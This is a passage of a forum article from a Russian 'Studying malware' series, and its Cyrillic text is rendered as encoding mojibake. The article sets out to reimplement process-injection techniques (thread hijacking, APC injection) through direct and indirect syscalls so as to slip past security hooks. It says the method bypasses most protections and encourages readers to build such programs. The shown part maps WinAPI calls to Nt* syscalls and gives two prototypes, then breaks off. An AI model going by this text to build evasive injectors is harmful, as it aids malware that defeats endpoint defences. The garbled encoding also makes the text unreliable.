–ë—ã–ª–æ –ø–æ–∫–∞–∑–∞–Ω–æ, —á—Ç–æ –æ–±—Ö–æ–¥ —Ö—É–∫–æ–≤ –≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–º —Ä–µ–∂–∏–º–µ –≤–æ–∑–º–æ–∂–µ–Ω —Å –ø–æ–º–æ—â—å—é –ø—Ä—è–º—ã—Ö —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤, –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞ SysWhispers –∏ —Ç–µ—Ö–Ω–∏–∫–∏ &quot;–í—Ä–∞—Ç–∞ –ê–¥–∞&quot;.<br />
<br />
<b><span style="color: rgb(184, 49, 47)">–í —Å–ª–µ–¥—É—é—â–µ–π —Å—Ç–∞—Ç—å–∏ —Ä–∞–Ω–µ–µ —Ä–µ–∞–ª–∏–∑–æ–≤–∞–Ω–Ω—ã–µ —Ç–µ—Ö–Ω–∏–∫–∏ –∏–Ω—ä–µ–∫—Ü–∏–∏ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ –±—É–¥—É—Ç –∏–∑–º–µ–Ω–µ–Ω—ã –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤ –≤–º–µ—Å—Ç–æ WinAPI.<br />
–í —Å–ª–µ–¥—É—é—â–µ–π —Å—Ç–∞—Ç—å–∏ –±—É–¥–µ—Ç –ø–æ–¥—Ä–æ–±–Ω—ã–π —Ä–∞–∑–±–æ—Ä –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è SysWhispers3 –∏ HellsGate.</span></b></div>
						

							<h2>–ü—Ä–µ–¥–µ–ª—å–Ω–∞—è —Ç–µ—Ö–Ω–∏–∫–∞-2. –ü—Ä–∞–∫—Ç–∏–∫–∞. –†–µ–∞–ª–∏–∑—É–µ–º —Ç–µ—Ö–Ω–∏–∫–∏ –∏–Ω—ä–µ–∫—Ü–∏–∏ —á–µ—Ä–µ–∑ —Å–∏—Å–∫–æ–ª—ã</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746786715233.png"
		data-src="https://osint42.org/attachments/1746786715233-png.227/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746786715233-png.227/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746786715233.png"
			title="1746786715233.png"
			width="1280" height="720" loading="lazy" />
	</div><br />
<br />
–í –ø—Ä–æ—à–ª–æ–π —Å—Ç–∞—Ç—å–µ:–ü—Ä–µ–¥–µ–ª—å–Ω–∞—è —Ç–µ—Ö–Ω–∏–∫–∞. –†–∞–∑–±–æ—Ä–∫–∞ —Å —Å–∏—Å–∫–æ–ª–∞–º–∏ | –¶–∏–∫–ª —Å—Ç–∞—Ç–µ–π &quot;–ò–∑—É—á–µ–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º&quot; –º—ã —Ä–∞–∑–æ–±—Ä–∞–ª–∏ —Ç–µ–æ—Ä–∏—é.<br />
<br />
–î–∞–≤–∞–π—Ç–µ —Ç–µ–ø–µ—Ä—å –ø–µ—Ä–µ–¥–µ–ª–∞–µ–º —Ç–µ—Ö–Ω–∏–∫–∏:<br />
<br />


<div class="embed fauxBlockLink" data-embed-content="ams_page-18" data-embed-content-url="https://bitsec42.org/ams/tsikl-statei-izucheniye-vredonosnykh-programm.6/page/izuchayem-tekhniku-thread-hijacking.18/">
	

<div class="embeddedAmsArticle block--messages">
	<div class="block-row block-row--separated" data-author="0x42">
		<div class="contentRow amsArticleSearchResultRow">
			
				<span class="contentRow-figure">
					
						<a href="page/izuchayem-tekhniku-thread-hijacking.18/index.html">
							<div class='amsThumbnail amsThumbnail--article'>
			<img class='amsThumbnail-image' src='../../data/attachments/0/121-5936b6a0fe070dbf88f407d1f35689b52cce.jpg?hash=xsuvKtBQ0o' loading='lazy' width='241' height='150' alt='–ò–∑—É—á–∞–µ–º —Ç–µ—Ö–Ω–∏–∫—É Thread Hijacking' />
			<span class='amsThumbnail-icon'></span>
			</div>
						</a>	
					
				</span>
			
			<div class="contentRow-main">
				<h3 class="contentRow-title">
					<a href="page/izuchayem-tekhniku-thread-hijacking.18/index.html"> –¶–∏–∫–ª —Å—Ç–∞—Ç–µ–π &quot;–ò–∑—É—á–µ–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º&quot; - –ò–∑—É—á–∞–µ–º —Ç–µ—Ö–Ω–∏–∫—É Thread Hijacking</a>
				</h3>

				<div class="contentRow-snippet">
					Thread Hijacking (–ü–æ—Ö–∏—â–µ–Ω–∏–µ –ø–æ—Ç–æ–∫–∞) - —ç—Ç–æ —Ç–µ—Ö–Ω–∏–∫–∞, –ø–æ–∑–≤–æ–ª—è—é—â–∞—è –≤—ã–ø–æ–ª–Ω—è—Ç—å –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É –±–µ–∑ —Å–æ–∑–¥–∞–Ω–∏—è –Ω–æ–≤–æ–≥–æ –ø–æ—Ç–æ–∫–∞. –≠—Ç–æ—Ç –º–µ—Ç–æ–¥ —Ä–∞–±–æ—Ç–∞–µ—Ç –ø—É—Ç–µ–º –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–∫–∏ –ø–æ—Ç–æ–∫–∞ –∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Ä–µ–≥–∏—Å—Ç—Ä–∞ –∞–¥—Ä–µ—Å–∞ –∫–æ–º–∞–Ω–¥—ã, —É–∫–∞–∑—ã–≤–∞—é—â–µ–≥–æ –Ω–∞ —Å–ª–µ–¥—É—é—â—É—é –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—é –≤ –ø–∞–º—è—Ç–∏, —á—Ç–æ–±—ã –æ–Ω —É–∫–∞–∑—ã–≤–∞–ª –Ω–∞ –Ω–∞—á–∞–ª–æ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏...
				</div>

				<div class="contentRow-minor contentRow-minor--hideLinks">
					<ul class="listInline listInline--bullet">
						<li><a href="https://osint42.org/members/0x42.1/" class="username " dir="auto" data-user-id="1" data-xf-init="member-tooltip"><span class="username--moderator username--admin">0x42</span></a></li>
						<li><time  class="u-dt" dir="auto" datetime="2025-05-09T12:00:03+0300" data-timestamp="1746781203" data-date="09.05.2025" data-time="12:00" data-short="9 –ú–∞–π" title="09.05.2025 –≤ 12:00">09.05.2025</time></li>
					</ul>
				</div>
			</div>
		</div>
	</div>
</div>
</div><br />


<div class="embed fauxBlockLink" data-embed-content="ams_page-22" data-embed-content-url="https://bitsec42.org/ams/tsikl-statei-izucheniye-vredonosnykh-programm.6/page/in-yektsiya-otobrazhayemoi-pamyati.22/">
	

<div class="embeddedAmsArticle block--messages">
	<div class="block-row block-row--separated" data-author="0x42">
		<div class="contentRow amsArticleSearchResultRow">
			
				<span class="contentRow-figure">
					
						<a href="page/in-yektsiya-otobrazhayemoi-pamyati.22/index.html">
							<div class='amsThumbnail amsThumbnail--article'>
			<img class='amsThumbnail-image' src='../../data/attachments/0/142-6b2a8f94002b22800112beedc28f81c8f6f2.jpg?hash=PUz950Z3C1' loading='lazy' width='618' height='150' alt='–ò–Ω—ä–µ–∫—Ü–∏—è –æ—Ç–æ–±—Ä–∞–∂–∞–µ–º–æ–π –ø–∞–º—è—Ç–∏' />
			<span class='amsThumbnail-icon'></span>
			</div>
						</a>	
					
				</span>
			
			<div class="contentRow-main">
				<h3 class="contentRow-title">
					<a href="page/in-yektsiya-otobrazhayemoi-pamyati.22/index.html"> –¶–∏–∫–ª —Å—Ç–∞—Ç–µ–π &quot;–ò–∑—É—á–µ–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º&quot; - –ò–Ω—ä–µ–∫—Ü–∏—è –æ—Ç–æ–±—Ä–∞–∂–∞–µ–º–æ–π –ø–∞–º—è—Ç–∏</a>
				</h3>

				<div class="contentRow-snippet">
					–õ–æ–∫–∞–ª—å–Ω–∞—è –∏–Ω—ä–µ–∫—Ü–∏—è –æ—Ç–æ–±—Ä–∞–∂–∞–µ–º–æ–π –ø–∞–º—è—Ç–∏
–í–≤–µ–¥–µ–Ω–∏–µ
–î–æ —Å–∏—Ö –ø–æ—Ä –≤–æ –≤—Å–µ—Ö –ø—Ä–µ–¥—ã–¥—É—â–∏—Ö —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—è—Ö –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª—Å—è —Ç–∏–ø –ª–æ–∫–∞–ª—å–Ω–æ–π –ø–∞–º—è—Ç–∏ –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è. –õ–æ–∫–∞–ª—å–Ω–∞—è –ø–∞–º—è—Ç—å –≤—ã–¥–µ–ª—è–µ—Ç—Å—è —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º VirtualAlloc –∏–ª–∏ VirtualAllocEx.

–ù–∞ —Å–ª–µ–¥—É—é—â–µ–º –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–∏ –ø–æ–∫–∞–∑–∞–Ω–∞...
				</div>

				<div class="contentRow-minor contentRow-minor--hideLinks">
					<ul class="listInline listInline--bullet">
						<li><a href="https://osint42.org/members/0x42.1/" class="username " dir="auto" data-user-id="1" data-xf-init="member-tooltip"><span class="username--moderator username--admin">0x42</span></a></li>
						<li><time  class="u-dt" dir="auto" datetime="2025-05-09T12:37:35+0300" data-timestamp="1746783455" data-date="09.05.2025" data-time="12:37" data-short="9 –ú–∞–π" title="09.05.2025 –≤ 12:37">09.05.2025</time></li>
					</ul>
				</div>
			</div>
		</div>
	</div>
</div>
</div><br />


<div class="embed fauxBlockLink" data-embed-content="ams_page-20" data-embed-content-url="https://bitsec42.org/ams/tsikl-statei-izucheniye-vredonosnykh-programm.6/page/izuchayem-tekhniku-apc-injection.20/">
	

<div class="embeddedAmsArticle block--messages">
	<div class="block-row block-row--separated" data-author="0x42">
		<div class="contentRow amsArticleSearchResultRow">
			
				<span class="contentRow-figure">
					
						<a href="page/izuchayem-tekhniku-apc-injection.20/index.html">
							<div class='amsThumbnail amsThumbnail--article'>
			<img class='amsThumbnail-image' src='../../data/attachments/0/134-37e964d2c7070e78abb7d7eea06206b0930b.jpg?hash=w6qNKrCkmc' loading='lazy' width='292' height='150' alt='–ò–∑—É—á–∞–µ–º —Ç–µ—Ö–Ω–∏–∫—É APC Injection' />
			<span class='amsThumbnail-icon'></span>
			</div>
						</a>	
					
				</span>
			
			<div class="contentRow-main">
				<h3 class="contentRow-title">
					<a href="page/izuchayem-tekhniku-apc-injection.20/index.html"> –¶–∏–∫–ª —Å—Ç–∞—Ç–µ–π &quot;–ò–∑—É—á–µ–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º&quot; - –ò–∑—É—á–∞–µ–º —Ç–µ—Ö–Ω–∏–∫—É APC Injection</a>
				</h3>

				<div class="contentRow-snippet">
					–ü—Ä–µ–¥–ª–∞–≥–∞—é –≤ —ç—Ç–æ–π —Å—Ç–∞—Ç—å–µ —Ä–∞—Å—Å–º–æ—Ç—Ä–µ—Ç—å –æ–¥–∏–Ω —Å–ø–æ—Å–æ–± –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –±–µ–∑ —Å–æ–∑–¥–∞–Ω–∏—è –Ω–æ–≤–æ–≥–æ –ø–æ—Ç–æ–∫–∞. –≠—Ç–æ—Ç –º–µ—Ç–æ–¥ –∏–∑–≤–µ—Å—Ç–µ–Ω –∫–∞–∫ APC-–∏–Ω—ä–µ–∫—Ü–∏—è.

–ß—Ç–æ —Ç–∞–∫–æ–µ APC? –ê—Å–∏–Ω—Ö—Ä–æ–Ω–Ω—ã–µ –≤—ã–∑–æ–≤—ã –ø—Ä–æ—Ü–µ–¥—É—Ä (APC) ‚Äî —ç—Ç–æ –º–µ—Ö–∞–Ω–∏–∑–º –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã Windows, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–∑–≤–æ–ª—è–µ—Ç –ø—Ä–æ–≥—Ä–∞–º–º–∞–º –≤—ã–ø–æ–ª–Ω—è—Ç—å –∑–∞–¥–∞—á–∏ –∞—Å–∏–Ω—Ö—Ä–æ–Ω–Ω–æ...
				</div>

				<div class="contentRow-minor contentRow-minor--hideLinks">
					<ul class="listInline listInline--bullet">
						<li><a href="https://osint42.org/members/0x42.1/" class="username " dir="auto" data-user-id="1" data-xf-init="member-tooltip"><span class="username--moderator username--admin">0x42</span></a></li>
						<li><time  class="u-dt" dir="auto" datetime="2025-05-09T12:30:01+0300" data-timestamp="1746783001" data-date="09.05.2025" data-time="12:30" data-short="9 –ú–∞–π" title="09.05.2025 –≤ 12:30">09.05.2025</time></li>
					</ul>
				</div>
			</div>
		</div>
	</div>
</div>
</div><br />
–° –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –∫–æ—Å–≤–µ–Ω–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ —Å–∏—Å–∫–æ–ª–∞, —ç—Ç–æ –ø–æ–º–æ–∂–µ—Ç –æ–±–æ–π—Ç–∏ –±–æ–ª—å—à–∏–Ω—Å—Ç–≤–æ —Å—Ä–µ–¥—Å—Ç–≤ –∑–∞—â–∏—Ç—ã.)<br />
<br />
–¢–∞–∫–∂–µ —ç—Ç–æ –º–æ–∂–µ—Ç –ø–æ—Å–ª—É–∂–∏—Ç—å –ø—Ä–∏–º–µ—Ä–æ–º, –∫–∞–∫ –¥–µ–ª–∞—Ç—å —Ç–∞–∫–∏–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã –∏ –≤—ã –º–æ–∂–µ—Ç–µ —É–∂–µ —Å–∞–º–∏ —Ä–µ–∞–ª–∏–∑–æ–≤—ã–≤–∞—Ç—å —Ç–∞–∫–∏–µ —à—Ç—É–∫–∏ –≤ —Å–≤–æ–∏—Ö –ø—Ä–æ–≥—Ä–∞–º–º–∞—Ö.)))<br />
<br />
<b><u>–ò—Ç–∞–∫ –Ω–∞—á–Ω–µ–º:</u><br />
<br />
1)–ü–µ—Ä–µ–ø–∏—Å—ã–≤–∞–µ–º —Ç–µ—Ö–Ω–∏–∫—É –ò–∑—É—á–∞–µ–º —Ç–µ—Ö–Ω–∏–∫—É Thread Hijacking | –¶–∏–∫–ª —Å—Ç–∞—Ç–µ–π &quot;–ò–∑—É—á–µ–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º&quot;<br />
<br />
–í–≤–µ–¥–µ–Ω–∏–µ</b><br />
<br />
–ö–ª–∞—Å—Å–∏—á–µ—Å–∫–∞—è —Ç–µ—Ö–Ω–∏–∫–∞ –∏–Ω—ä–µ–∫—Ü–∏–∏ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤, —Ä–∞—Å—Å–º–æ—Ç—Ä–µ–Ω–Ω–∞—è —Ä–∞–Ω–µ–µ, –±—É–¥–µ—Ç —Ä–µ–∞–ª–∏–∑–æ–≤–∞–Ω–∞ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –ø—Ä—è–º—ã—Ö —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤, –∑–∞–º–µ–Ω—è—è WinAPI –Ω–∞ –∏—Ö —ç–∫–≤–∏–≤–∞–ª–µ–Ω—Ç –≤ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–∞—Ö.<br />
<br />
VirtualAlloc/Ex –∑–∞–º–µ–Ω—è–µ—Ç—Å—è –Ω–∞ NtAllocateVirtualMemory<br />
<br />
VirtualProtect/Ex –∑–∞–º–µ–Ω—è–µ—Ç—Å—è –Ω–∞ NtProtectVirtualMemory<br />
<br />
WriteProcessMemory –∑–∞–º–µ–Ω—è–µ—Ç—Å—è –Ω–∞ NtWriteVirtualMemory<br />
<br />
CreateThread/RemoteThread –∑–∞–º–µ–Ω—è–µ—Ç—Å—è –Ω–∞ NtCreateThreadEx<br />
<br />
<b>–¢—Ä–µ–±—É–µ–º—ã–µ —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã</b><br />
<br />
–í —ç—Ç–æ–º —Ä–∞–∑–¥–µ–ª–µ –±—É–¥—É—Ç —Ä–∞—Å—Å–º–æ—Ç—Ä–µ–Ω—ã —Ç—Ä–µ–±—É–µ–º—ã–µ —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã –∏ –∏—Ö –ø–∞—Ä–∞–º–µ—Ç—Ä—ã.<br />
<br />
<b>NtAllocateVirtualMemory</b><br />
<br />
–≠—Ç–æ —Ä–µ–∑—É–ª—å—Ç–∞—Ç —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –∏–∑ WinAPI-—Ñ—É–Ω–∫—Ü–∏–π VirtualAlloc –∏ VirtualAllocEx.<br />
NtAllocateVirtualMemory –ø–æ–∫–∞–∑–∞–Ω –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NTSTATUS NtAllocateVirtualMemory(
  IN HANDLE           ProcessHandle,    // –î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –ø—Ä–æ—Ü–µ—Å—Å–∞, –≤ –∫–æ—Ç–æ—Ä–æ–º –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –≤—ã–¥–µ–ª–∏—Ç—å –ø–∞–º—è—Ç—å
  IN OUT PVOID        *BaseAddress,     // –í–æ–∑–≤—Ä–∞—â–∞–µ–º—ã–π –±–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å –≤—ã–¥–µ–ª–µ–Ω–Ω–æ–π –ø–∞–º—è—Ç–∏
  IN ULONG_PTR        ZeroBits,         // –í—Å–µ–≥–¥–∞ —É—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ –≤ &#039;0&#039;
  IN OUT PSIZE_T      RegionSize,       // –†–∞–∑–º–µ—Ä –ø–∞–º—è—Ç–∏ –¥–ª—è –≤—ã–¥–µ–ª–µ–Ω–∏—è
  IN ULONG            AllocationType,   // MEM_COMMIT | MEM_RESERVE
  IN ULONG            Protect           // –ó–∞—â–∏—Ç–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
);</code></pre>
	</div>
</div><br />
NtAllocateVirtualMemory –∞–Ω–∞–ª–æ–≥–∏—á–µ–Ω WinAPI —Ñ—É–Ω–∫—Ü–∏–∏ VirtualAllocEx. –û–¥–Ω–∞–∫–æ –æ–Ω –æ—Ç–ª–∏—á–∞–µ—Ç—Å—è —Ç–µ–º, —á—Ç–æ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã RegionSize –∏ BaseAddress –ø–µ—Ä–µ–¥–∞—é—Ç—Å—è –ø–æ —Å—Å—ã–ª–∫–µ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –æ–ø–µ—Ä–∞—Ç–æ—Ä–∞ –∞–¥—Ä–µ—Å–∞ (&amp;).<br />
ZeroBits - —ç—Ç–æ –Ω–æ–≤—ã–π –≤–≤–µ–¥–µ–Ω–Ω—ã–π –ø–∞—Ä–∞–º–µ—Ç—Ä, –∫–æ—Ç–æ—Ä—ã–π –æ–ø—Ä–µ–¥–µ–ª—è–µ—Ç—Å—è –∫–∞–∫ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Å—Ç–∞—Ä—à–∏—Ö –±–∏—Ç–æ–≤ –∞–¥—Ä–µ—Å–∞, –∫–æ—Ç–æ—Ä—ã–µ –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å —Ä–∞–≤–Ω—ã –Ω—É–ª—é –≤ –±–∞–∑–æ–≤–æ–º –∞–¥—Ä–µ—Å–µ –æ–±–∑–æ—Ä–∞ —Å–µ–∫—Ü–∏–∏. –≠—Ç–æ—Ç –ø–∞—Ä–∞–º–µ—Ç—Ä –≤—Å–µ–≥–¥–∞ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç—Å—è –Ω–∞ –Ω–æ–ª—å.<br />
<br />
–ü–∞—Ä–∞–º–µ—Ç—Ä RegionSize –ø–æ–º–µ—á–µ–Ω –∫–∞–∫ –≤—Ö–æ–¥–Ω–æ–π –∏ –≤—ã—Ö–æ–¥–Ω–æ–π –ø–∞—Ä–∞–º–µ—Ç—Ä. –≠—Ç–æ —Å–≤—è–∑–∞–Ω–æ —Å —Ç–µ–º, —á—Ç–æ –∑–Ω–∞—á–µ–Ω–∏–µ RegionSize –º–æ–∂–µ—Ç –∏–∑–º–µ–Ω—è—Ç—å—Å—è –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç —Ç–æ–≥–æ, —á—Ç–æ –±—ã–ª–æ —Ñ–∞–∫—Ç–∏—á–µ—Å–∫–∏ –≤—ã–¥–µ–ª–µ–Ω–æ. Microsoft —É—Ç–≤–µ—Ä–∂–¥–∞–µ—Ç, —á—Ç–æ –Ω–∞—á–∞–ª—å–Ω–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ RegionSize —É–∫–∞–∑—ã–≤–∞–µ—Ç —Ä–∞–∑–º–µ—Ä –≤ –±–∞–π—Ç–∞—Ö –æ–±–ª–∞—Å—Ç–∏, –∫–æ—Ç–æ—Ä—ã–π –æ–∫—Ä—É–≥–ª—è–µ—Ç—Å—è –¥–æ —Å–ª–µ–¥—É—é—â–µ–π –≥—Ä–∞–Ω–∏—Ü—ã —Ä–∞–∑–º–µ—Ä–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—ã —Ö–æ—Å—Ç–∞. –≠—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ NtAllocateVirtualMemory –æ–∫—Ä—É–≥–ª—è–µ—Ç –¥–æ –±–ª–∏–∂–∞–π—à–µ–≥–æ –∫—Ä–∞—Ç–Ω–æ–≥–æ —Ä–∞–∑–º–µ—Ä–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—ã, –∫–æ—Ç–æ—Ä—ã–π —Å–æ—Å—Ç–∞–≤–ª—è–µ—Ç 4096 –±–∞–π—Ç. –ù–∞–ø—Ä–∏–º–µ—Ä, –µ—Å–ª–∏ RegionSize —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –Ω–∞ 5000 –±–∞–π—Ç, –æ–Ω –æ–∫—Ä—É–≥–ª–∏—Ç –µ–≥–æ –¥–æ 8192, –∏ RegionSize –≤–µ—Ä–Ω–µ—Ç –∑–Ω–∞—á–µ–Ω–∏–µ, –∫–æ—Ç–æ—Ä–æ–µ –±—ã–ª–æ –≤—ã–¥–µ–ª–µ–Ω–æ, —Ç–æ –µ—Å—Ç—å 8192 –≤ —ç—Ç–æ–º –ø—Ä–∏–º–µ—Ä–µ.<br />
<br />
–ö–∞–∫ —É–∂–µ —É–ø–æ–º–∏–Ω–∞–ª–æ—Å—å –≤ –ø—Ä–µ–¥—ã–¥—É—â–∏—Ö —Å—Ç–∞—Ç—å—è—Ö, –≤—Å–µ —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã –≤–æ–∑–≤—Ä–∞—â–∞—é—Ç NTSTATUS. –ï—Å–ª–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ —É—Å–ø–µ—à–Ω–æ, –æ–Ω —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç—Å—è –≤ STATUS_SUCCESS (0). –í –ø—Ä–æ—Ç–∏–≤–Ω–æ–º —Å–ª—É—á–∞–µ, –µ—Å–ª–∏ —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ –Ω–µ —É–¥–∞–µ—Ç—Å—è, –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç—Å—è –Ω–µ–Ω—É–ª–µ–≤–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ.<br />
<br />
<b>NtProtectVirtualMemory</b><br />
<br />
–≠—Ç–æ —Ä–µ–∑—É–ª—å—Ç–∞—Ç —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –∏–∑ WinAPI-—Ñ—É–Ω–∫—Ü–∏–π VirtualProtect –∏ VirtualProtectEx. NtProtectVirtualMemory –ø–æ–∫–∞–∑–∞–Ω –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NTSTATUS NtProtectVirtualMemory(
  IN HANDLE               ProcessHandle,              // –î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –ø—Ä–æ—Ü–µ—Å—Å–∞, –∑–∞—â–∏—Ç–∞ –ø–∞–º—è—Ç–∏ –∫–æ—Ç–æ—Ä–æ–≥–æ –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –∏–∑–º–µ–Ω–µ–Ω–∞
  IN OUT PVOID            *BaseAddress,               // –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –±–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å –¥–ª—è –∑–∞—â–∏—Ç—ã
  IN OUT PULONG           NumberOfBytesToProtect,     // –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ —Ä–∞–∑–º–µ—Ä –æ–±–ª–∞—Å—Ç–∏ –¥–ª—è –∑–∞—â–∏—Ç—ã
  IN ULONG                NewAccessProtection,        // –ù–æ–≤–∞—è —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º–∞—è –∑–∞—â–∏—Ç–∞ –ø–∞–º—è—Ç–∏
  OUT PULONG              OldAccessProtection         // –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é, –∫–æ—Ç–æ—Ä–∞—è –ø–æ–ª—É—á–∞–µ—Ç –ø—Ä–µ–¥—ã–¥—É—â—É—é –∑–∞—â–∏—Ç—É –¥–æ—Å—Ç—É–ø–∞
);</code></pre>
	</div>
</div><br />
–û–±–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ BaseAddress –∏ NumberOfBytesToProtect –ø–µ—Ä–µ–¥–∞—é—Ç—Å—è –ø–æ —Å—Å—ã–ª–∫–µ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –æ–ø–µ—Ä–∞—Ç–æ—Ä–∞ &quot;–∞–¥—Ä–µ—Å&quot;.<br />
<br />
–ü–∞—Ä–∞–º–µ—Ç—Ä NumberOfBytesToProtect –≤–µ–¥–µ—Ç —Å–µ–±—è –∞–Ω–∞–ª–æ–≥–∏—á–Ω–æ –ø–∞—Ä–∞–º–µ—Ç—Ä—É RegionSize –≤ NtAllocateVirtualMemory, –æ–∫—Ä—É–≥–ª—è—è –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –±–∞–π—Ç–æ–≤ –¥–æ –±–ª–∏–∂–∞–π—à–µ–≥–æ –∫—Ä–∞—Ç–Ω–æ–≥–æ —Ä–∞–∑–º–µ—Ä–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—ã.<br />
<br />
<b>NtWriteVirtualMemory</b><br />
<br />
–≠—Ç–æ —Ä–µ–∑—É–ª—å—Ç–∞—Ç —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –∏–∑ WinAPI-—Ñ—É–Ω–∫—Ü–∏–∏ WriteProcessMemory. NtWriteVirtualMemory –ø–æ–∫–∞–∑–∞–Ω –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
